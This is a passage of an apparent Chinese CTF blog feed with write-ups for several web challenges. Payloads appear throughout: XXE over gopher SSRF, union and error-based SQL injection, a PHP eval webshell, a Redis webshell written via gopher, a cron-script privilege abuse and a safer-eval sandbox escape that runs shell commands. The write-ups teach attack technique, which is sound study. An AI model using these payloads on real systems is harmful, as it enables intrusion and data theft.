data=%3C%3Fxml%20version%20%3D%20%221.0%22%3F%3E%0A%3C!DOCTYPE%20ANY%20%5B%0A%20%20%20%20%3C!ENTITY%20f%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dhints.php%22%3E%0A%5D%3E%0A%3Cx%3E%26f%3B%3C%2Fx%3E
&amp;quot;&amp;quot;&amp;quot;.replace(&amp;quot;\n&amp;quot;, &amp;quot;\r\n&amp;quot;)#data需要先URL编码一次
print(quote(stream))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST%20/xxe.php%20HTTP/1.1%0D%0AHost%3A%20121.36.64.91%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%20225%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0A%0D%0Adata%3D%253C%253Fxml%2520version%2520%253D%2520%25221.0%2522%253F%253E%250A%253C%21DOCTYPE%2520ANY%2520%255B%250A%2520%2520%2520%2520%253C%21ENTITY%2520f%2520SYSTEM%2520%2522php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253D%252566%25256c%252561%252567.%252570%252568%252570%2522%253E%250A%255D%253E%250A%253Cx%253E%2526f%253B%253C%252Fx%253E%0D%0A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;拿去URLencode之后，用gopher协议打（gopher协议后面的数据需要二次编码）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?a=xxx&amp;amp;b=xxx&amp;amp;c=gopher%3a%2f%2f127.0.0.1%3a80%2f_POST%2520%2fxxe.php%2520HTTP%2f1.1%250D%250AHost%253A%2520121.36.64.91%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%2520238%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Adata%253D%25253C%25253Fxml%252520version%252520%25253D%252520%2525221.0%252522%25253F%25253E%25250A%25253C%2521DOCTYPE%252520ANY%252520%25255B%25250A%252520%252520%252520%252520%25253C%2521ENTITY%252520f%252520SYSTEM%252520%252522php%25253A%25252F%25252Ffilter%25252Fconvert.base64-encode%25252Fresource%25253D%252566%25256c%252561%252567.%252570%252568%252570%252522%25253E%25250A%25255D%25253E%25250A%25253Cx%25253E%252526f%25253B%25253C%25252Fx%25253E%250D%250A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上面这个payload是xxe直接flag.php，但是没双写所以读不到，然后flag关键字还是需要URLencode，其实也就相当于利用了超全局变量，和另外一个方法比起来简直弱爆了&lt;/p&gt;
&lt;p&gt;注意&lt;/p&gt;
&lt;p&gt;1.修改数据时记得改POST请求头的Content-Type；&lt;/p&gt;
&lt;p&gt;2.记得双写，xxe.php的过滤是替换为空&lt;/p&gt;
&lt;p&gt;3.万万不要读取hints.php和main.php，最后会走到一个做不出来的pop链&lt;/p&gt;
&lt;p&gt;复现到这里，再次哭晕；&lt;/p&gt;
</description>
        </item>
        <item>
        <title>中计量现科CTF竞赛</title>
        <link>https://anthem-whisper.github.io/p/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%8E%B0%E7%A7%91ctf%E7%AB%9E%E8%B5%9B/</link>
        <pubDate>Sun, 21 Jun 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%8E%B0%E7%A7%91ctf%E7%AB%9E%E8%B5%9B/</guid>
        <description>&lt;hr&gt;
&lt;h3 id=&#34;easyweb&#34;&gt;easyweb&lt;/h3&gt;
&lt;p&gt;源码忘了脱下来，大概考察PHP strcmp()函数，直接数组绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?password[]=shit
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;成绩单&#34;&gt;成绩单&lt;/h3&gt;
&lt;p&gt;白给题，Union注入无任何过滤，上来直接一血&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id=-1&#39; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#
//fl4g,sc
id=-1&#39; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;fl4g&#39;#
//flag
id=-1&#39; union select 1,flag,3,4 from fl4g#
//flag{Sql_INJECT0N_4813drd8hz4}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;shop&#34;&gt;shop&lt;/h3&gt;
&lt;p&gt;考点：条件竞争&lt;/p&gt;
&lt;p&gt;说实话一开始以为是逻辑漏洞，尝试了半天没搞出来，想到了条件竞争但是因为爆破的时候线程设置的不够高，所以没搞出来，时候来又尝试了一次才想到。&lt;/p&gt;
&lt;h4 id=&#34;什么是条件竞争&#34;&gt;什么是条件竞争&lt;/h4&gt;
&lt;p&gt;参考：https://www.jianshu.com/p/09d0eb938e6a&lt;/p&gt;
&lt;p&gt;竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。&lt;/p&gt;
&lt;p&gt;开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。&lt;/p&gt;
&lt;p&gt;线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。&lt;/p&gt;
&lt;h4 id=&#34;两个例子&#34;&gt;两个例子&lt;/h4&gt;
&lt;h5 id=&#34;例1金额提现&#34;&gt;例1：金额提现&lt;/h5&gt;
&lt;p&gt;假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。&lt;/p&gt;
&lt;h5 id=&#34;例2先存储文件再判断是否合法然后再删除&#34;&gt;例2：先存储文件，再判断是否合法，然后再删除。&lt;/h5&gt;
&lt;p&gt;首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”&lt;/p&gt;
&lt;p&gt;攻击：首先上传一个php文件&lt;/p&gt;
&lt;p&gt;当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。&lt;/p&gt;
&lt;h4 id=&#34;回到题目&#34;&gt;回到题目&lt;/h4&gt;
&lt;p&gt;打开题目，显示账户剩余20元，flag需要21元，然后你可以输入小于等于20元的金额，另外有个重置按钮&lt;/p&gt;
&lt;p&gt;思路就是分别抓两个包，一个不停的支付20元，一个不停的重置，在高并发的情况下服务器响应不过来就可以造成支付两次&lt;/p&gt;
&lt;p&gt;注意事项就是支付金额最好是10元以上，如果是一两元的话，就不能和另外一个包形成竞争还有就是线程要多&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1
Host: aaaed42d.yunyansec.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/§72§.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://aaaed42d.yunyansec.com
Connection: close
Referer: http://aaaed42d.yunyansec.com/
Upgrade-Insecure-Requests: 1
 
money=20&amp;amp;submit=
POST / HTTP/1.1
Host: aaaed42d.yunyansec.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/§72§.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://aaaed42d.yunyansec.com
Connection: close
Referer: http://aaaed42d.yunyansec.com/
Upgrade-Insecure-Requests: 1
 
money=&amp;amp;restart=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开两个intruder，线程20，爆破出flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171516.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;easy&#34;&gt;easy&lt;/h3&gt;
&lt;p&gt;考点：二次注入&lt;/p&gt;
&lt;p&gt;打开就一个注册登录界面，admin账户已经注册了，登录之后可以改密码，本来以为是越权，后来放出了hint是二次注入，以前对于这样的二次注入比较陌生，感觉此题还是有点意思&lt;/p&gt;
&lt;h4 id=&#34;利用注册用户名进行sqli&#34;&gt;利用注册用户名进行sqli&lt;/h4&gt;
&lt;p&gt;注册这里没有sqli，在改密码那里才可以触发，盲猜查询语句：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;update XXX set password = &amp;quot;xxx&amp;quot; where username = &amp;quot;xxx&amp;quot; and (old)password = &amp;quot;xx&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hint提示了注入之后，在注册用户名那里，注册：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;admin&amp;quot;#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;登录进去之后，修改密码为123456，改完之后我们可以直接123456登录admin的账户了，说明我们已经注入成功了&lt;/p&gt;
&lt;p&gt;但是到这里一筹莫展，后来才想到可以继续利用sqli查信息&lt;/p&gt;
&lt;h4 id=&#34;利用报错注入查信息&#34;&gt;利用报错注入查信息&lt;/h4&gt;
&lt;p&gt;简单fuzz了一下，空格，/**/这些被过滤了，update不知道能不能union，我直接想到报错注入+括号套娃&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;test&amp;quot;||updatexml(2,concat(0x7e,(database())),0)#
//easy
abc&amp;quot;||updatexml(2,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#39;easy&#39;)),0)#
//article,flag,user
abc&amp;quot;||updatexml(2,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;flag&#39;)),0)#
//flag
abc&amp;quot;||updatexml(2,concat(0x7e,(select(flag)from(flag))),0)#
//flag{We11D0Ne_hOhO}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171534.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;其实主要就是这个二次注入比较难想到，学到许多&lt;/p&gt;
</description>
        </item>
        <item>
        <title>GKCTF2020复现</title>
        <link>https://anthem-whisper.github.io/p/gkctf2020%E5%A4%8D%E7%8E%B0/</link>
        <pubDate>Sat, 20 Jun 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/gkctf2020%E5%A4%8D%E7%8E%B0/</guid>
        <description>&lt;p&gt;GKCTF，题好平台棒，因为那段时间比赛太多就没打，现在填坑&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;checkinhttpsbuuojcnchallengesgkctf2020checkin&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[GKCTF2020]CheckIN&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CheckIN&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：PHP73 bypass disable_functions&lt;/p&gt;
&lt;p&gt;打开题目是源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;title&amp;gt;Check_In&amp;lt;/title&amp;gt;
&amp;lt;?php
highlight_file(__FILE__);
class ClassName
{
  public $code = null;
  public $decode = null;
  function __construct()
  {
    $this-&amp;gt;code = @$this-&amp;gt;x()[&#39;Ginkgo&#39;];
    $this-&amp;gt;decode = @base64_decode( $this-&amp;gt;code );
    @Eval($this-&amp;gt;decode);
  }
 
  public function x()
  {
    return $_REQUEST;
  }
}
 
new ClassName();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;目标很明确，传入 &lt;code&gt;?Ginkgo=（PHP代码）&lt;/code&gt; 就可以RCE，我们执行以下 &lt;code&gt;phpinfo()&lt;/code&gt; 发现正常回显，但是system却没有回显。&lt;/p&gt;
&lt;p&gt;我先构造一个shell蚁剑连接再说：&lt;code&gt;?Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs=&lt;/code&gt; （?Ginkgo=eval($_POST[&amp;lsquo;cmd&amp;rsquo;]);）&lt;/p&gt;
&lt;p&gt;连接上之后，可以使用文件系统，但是虚拟终端却不能执行命令，猜测是disable_functions，在phpinfo里面果然翻到了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171337.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;关于bypass diable_functions，这里推荐&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/hookjoy/p/10167315.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;一篇文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;有四种绕过 &lt;code&gt;disable_functions&lt;/code&gt; 的手法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；&lt;/li&gt;
&lt;li&gt;第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；&lt;/li&gt;
&lt;li&gt;第三种，mod_cgi 模式，尝试修改 &lt;code&gt;.htaccess&lt;/code&gt;，调整请求访问路由，绕过 php.ini 中的任何限制；&lt;/li&gt;
&lt;li&gt;第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里用的一个&lt;a class=&#34;link&#34; href=&#34;https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;bypass PHP7.0-7.3 disable_function的PoC&lt;/a&gt;，用蚁剑上传到/tmp，index包含他就可以看到结果了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171346.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;cve版签到httpsbuuojcnchallengesgkctf2020cve版签到&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[GKCTF2020]cve%e7%89%88%e7%ad%be%e5%88%b0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;cve版签到&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：cve-2020-7066&lt;/p&gt;
&lt;h4 id=&#34;cve-2020-7066&#34;&gt;CVE-2020-7066&lt;/h4&gt;
&lt;p&gt;在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将 &lt;code&gt;get_headers()&lt;/code&gt; 与用户提供的URL一起使用时，如果URL包含零（\ 0）字符（不可见字符），则URL将被静默地截断。这可能会导致某些软件对 &lt;code&gt;get_headers()&lt;/code&gt; 的目标做出错误的假设，并可能将某些信息发送到错误的服务器。&lt;/p&gt;
&lt;h4 id=&#34;payload&#34;&gt;payload&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;?url=http://127.0.0.1%00\.ctfhub.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到一个hint：&lt;code&gt; Tips: Host must be end with &#39;123&#39;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?url=http://127.0.0.123%00\.ctfhub.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{1608cce2-94d1-4014-9927-a9738ea8280e}&lt;/p&gt;
&lt;h3 id=&#34;老八小超市儿httpsbuuojcnchallengesgkctf2020老八小超市儿&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[GKCTF2020]%e8%80%81%e5%85%ab%e5%b0%8f%e8%b6%85%e5%b8%82%e5%84%bf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;老八小超市儿&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：shopxo后台弱口令，安装主题Getshell，定时脚本利用&lt;/p&gt;
&lt;p&gt;打开页面，在页脚发现一行话： &lt;code&gt;Powered by ShopXO v1.8.0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;对于ShopXO这个框架，网上大致三种利用方法：&lt;code&gt;CVE-2019-5886/7&lt;/code&gt; ， &lt;code&gt;后台弱口令&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;弱口令&#34;&gt;弱口令&lt;/h4&gt;
&lt;p&gt;访问 &lt;code&gt;admin.php&lt;/code&gt; ，用户名 &lt;code&gt;admin&lt;/code&gt; 密码 &lt;code&gt;shopxo&lt;/code&gt; 就进去了。。。&lt;/p&gt;
&lt;h4 id=&#34;后台利用主题安装getshell&#34;&gt;后台利用主题安装Getshell&lt;/h4&gt;
&lt;p&gt;来到网站管理后台，在 &lt;code&gt;应用中心 -&amp;gt; 应用商店 -&amp;gt; 主题&lt;/code&gt; 里面可以下载主题文件到本地&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171356.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;然后在 &lt;code&gt;网站管理 -&amp;gt; 主题管理 -&amp;gt; 主题安装&lt;/code&gt; 通过上传含有webshell的主题来获取一个webshell&lt;/p&gt;
&lt;p&gt;F12可以看到shell的路径：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171403.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;访问发现页面存在，直接蚁剑连接；&lt;/p&gt;
&lt;h4 id=&#34;利用定时文件root权限读取flag&#34;&gt;利用定时文件root权限读取flag&lt;/h4&gt;
&lt;p&gt;在根目录发现假的flag，旁边flag.hint&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171411.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;发现每分钟内容都会变一次，然后找到了根目录的auto.sh&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171416.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;直接访问这个py文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import os
import io
import time
os.system(&amp;quot;whoami&amp;quot;) 
gk1=str(time.ctime())
gk=&amp;quot;\nGet the Root,The Date Is Userful!&amp;quot;
f=io.open(&amp;quot;/flag.hint&amp;quot;, &amp;quot;rb+&amp;quot;)
f.write(str(gk1))
f.write(str(gk))
f.close()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;猜测这个py文件的权限比较高，可以读取/root/flag，于是直接加两行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import os
import io
import time
os.system(&amp;quot;whoami&amp;quot;) 
gk1=str(time.ctime())
gk=&amp;quot;shit\n&amp;quot;
f=io.open(&amp;quot;/flag.hint&amp;quot;, &amp;quot;rb+&amp;quot;)
#s=open(&amp;quot;/root/flag&amp;quot;,&amp;quot;r&amp;quot;).read()
s=os.system(&amp;quot;cat /root/*|grep &#39;flag&#39;&amp;quot;)
f.write(s)
f.write(str(gk1))
f.write(str(gk))
f.close()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;隔一会儿访问/flag.hint就有flag：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171423.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;ez三剑客-ezwebhttpsbuuojcnchallengesgkctf2020ez三剑客-ezweb&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[GKCTF2020]EZ%e4%b8%89%e5%89%91%e5%ae%a2-EzWeb&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;EZ三剑客-EzWeb&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：SSRF，file关键字绕过，gopher协议打redis未授权，redis写webshell&lt;/p&gt;
&lt;p&gt;SSRF学习链接&amp;raquo;&lt;a href=&#34;https://hackmd.io/@Lhaihai/H1B8PJ9hX&#34;&gt;https://hackmd.io/@Lhaihai/H1B8PJ9hX&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;打开是一个提交URL的页面，输入127.0.0.1会回显&amp;quot;别这样&amp;quot;，盲猜SSRF；&lt;/p&gt;
&lt;h4 id=&#34;利用file协议尝试读取本机文件&#34;&gt;利用file协议尝试读取本机文件&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;file:///etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;回显&amp;quot;别这样&amp;quot;；&lt;/p&gt;
&lt;p&gt;可以利用 &lt;code&gt;file:/etc/passwd&lt;/code&gt; 绕过&lt;/p&gt;
&lt;p&gt;读取index源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file:/var/www/html/index.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
}
 
if(isset($_GET[&#39;submit&#39;])){
		$url = $_GET[&#39;url&#39;];
		//echo $url.&amp;quot;\n&amp;quot;;
		if(preg_match(&#39;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#39;, $url,$match))
		{
			//var_dump($match);
			die(&#39;别这样&#39;);
		}
		curl($url);
}
if(isset($_GET[&#39;secret&#39;])){
	system(&#39;ifconfig&#39;);
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到，确实是ban掉了&lt;code&gt;file://&lt;/code&gt; &lt;code&gt;dict&lt;/code&gt; 等关键字。&lt;/p&gt;
&lt;p&gt;但是flag貌似并不在这台机器上面；&lt;/p&gt;
&lt;p&gt;读取/etc/hosts和/proc/net/arp文件之后都没有发现什么有用的东西，ifconfig回显里面给出了本机的内网ip，于是去尝试爆破C段；&lt;/p&gt;
&lt;h4 id=&#34;利用bp的intruder模块爆破c段&#34;&gt;利用bp的intruder模块爆破C段&lt;/h4&gt;
&lt;p&gt;发到intruder，设置Position和Payload，在xx.xx.xx.11发现了回显：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171432.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;继续尝试爆破端口，发现6379的redis报错（其实猜也能猜，一般就是3306和6379）&lt;/p&gt;
&lt;h4 id=&#34;利用gopher协议打内网未授权redis&#34;&gt;利用gopher协议打内网未授权redis&lt;/h4&gt;
&lt;p&gt;之前说过ban了dict，我们这里还有gopher协议；&lt;/p&gt;
&lt;p&gt;直接往web路径写shell：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gopher://173.169.113.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接前端提交：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;173.169.113.11/shell.php?cmd=cat%20/flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到flag&lt;/p&gt;
&lt;h3 id=&#34;gkctf2020ez三剑客-eznodehttpsbuuojcnchallengesgkctf2020ez三剑客-eznode&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[GKCTF2020]EZ%e4%b8%89%e5%89%91%e5%ae%a2-EzNode&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GKCTF2020]EZ三剑客-EzNode&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：NodeJs审计、settimeout函数漏洞&lt;/p&gt;
&lt;p&gt;参考&amp;raquo;&lt;a class=&#34;link&#34; href=&#34;https://guokeya.github.io/post/a45x0caHd/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Guoke师傅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;打开页面是个计算器，给了源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const express = require(&#39;express&#39;);
const bodyParser = require(&#39;body-parser&#39;);
 
const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 找到一个很棒的库
 
const fs = require(&#39;fs&#39;);
 
const app = express();
 
 
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
 
// 2020.1/WORKER2 老板说为了后期方便优化
app.use((req, res, next) =&amp;gt; {
  if (req.path === &#39;/eval&#39;) {//如果请求路径是/eval，就执行
    let delay = 60 * 1000;//定义一个变量delay
    console.log(delay);
    if (Number.isInteger(parseInt(req.query.delay))) {//如果请求参数delay是整数，就把传入的和之前定义取最大值复制给delay
      delay = Math.max(delay, parseInt(req.query.delay));
    }
    const t = setTimeout(() =&amp;gt; next(), delay);//设置超时，如果超时就进入下一个路由
    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
    setTimeout(() =&amp;gt; {
      clearTimeout(t);
      console.log(&#39;timeout&#39;);
      try {
        res.send(&#39;Timeout!&#39;);
      } catch (e) {
 
      }
    }, 1000);//超时一秒就就执行timeout
  } else {
    next();
  }
});
 
app.post(&#39;/eval&#39;, function (req, res) {
  let response = &#39;&#39;;
  if (req.body.e) {
    try {
      response = saferEval(req.body.e);//可执行恶意代码
    } catch (e) {
      response = &#39;Wrong Wrong Wrong!!!!&#39;;
    }
  }
  res.send(String(response));
});
 
// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get(&#39;/source&#39;, function (req, res) {
  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./index.js&#39;));
});
 
// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
app.get(&#39;/version&#39;, function (req, res) {
  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./package.json&#39;));
});
 
app.get(&#39;/&#39;, function (req, res) {
  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./index.html&#39;))
})
 
app.listen(80, &#39;0.0.0.0&#39;, () =&amp;gt; {
  console.log(&#39;Start listening&#39;)
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;主要就是要看懂代码，大概意思就是：&lt;/p&gt;
&lt;p&gt;我们传入一个delay和原来的delay比较，取最大值，然后作为形参传给timeout这个函数，如果代码执行的时间超过了这个值，就执行eval；&lt;/p&gt;
&lt;p&gt;问题就出在这个settimeout函数上。&lt;/p&gt;
&lt;h4 id=&#34;interger超过2147483647可以使int溢出&#34;&gt;interger超过2147483647可以使int溢出&lt;/h4&gt;
&lt;p&gt;这里借用&lt;a class=&#34;link&#34; href=&#34;https://guokeya.github.io/post/a45x0caHd/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Guoke&lt;/a&gt;师傅的一张图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171441.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h4 id=&#34;沙箱逃逸原型链污染&#34;&gt;沙箱逃逸，原型链污染&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/7842&#34;&gt;https://xz.aliyun.com/t/7842&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;GET传入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?delay=2147483648
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;POST：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;e=clearImmediate.constructor(&amp;quot;return process;&amp;quot;)().mainModule.require(&amp;quot;child_process&amp;quot;).execSync(&amp;quot;cat /flag&amp;quot;).toString()
